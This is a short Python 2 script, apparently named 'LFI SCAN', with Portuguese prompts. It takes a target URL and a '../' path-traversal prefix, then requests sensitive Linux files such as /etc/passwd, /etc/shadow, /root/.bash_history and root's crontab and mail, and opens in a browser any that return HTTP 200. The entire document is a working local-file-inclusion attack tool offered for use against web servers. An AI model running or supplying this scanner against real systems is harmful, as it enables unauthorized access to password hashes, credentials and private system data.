#!/usr/bin/env python
#coding: utf-8

#coded by et1m

__author__ = "et1m"

print' _      ______ _____    _____  _____          _   _ '
print'| |    |  ____|_   _|  / ____|/ ____|   /\   | \ | |'
print'| |    | |__    | |   | (___ | |       /  \  |  \| |'
print'| |    |  __|   | |    \___ \| |      / /\ \ | . ` |'
print'| |____| |     _| |_   ____) | |____ / ____ \| |\  |'
print'|______|_|    |_____| |_____/ \_____/_/    \_\_| \_|'

print ''
print ''

import requests
import webbrowser

print 'Use em servidores que rodam Linux'
alvo = raw_input("digite seu alvo: ")
print''
cd = raw_input("digite os ../    : " )
print ''
print("Você digitou:    " + alvo + cd) 
print ''

paginas = ['/etc/passwd','/etc/issue','/proc/version','/etc/profile','/etc/shadow','/root/.bash_history','/var/log/dmessage','/var/mail/root','/var/spool/cron/crontabs/root']

for x in paginas:
                  check = requests.get(alvo + cd + x)
                  if check.status_code == 200:  #se o get der certo então abre o browser com o url completo 
                                    webbrowser.open(alvo + cd + x)
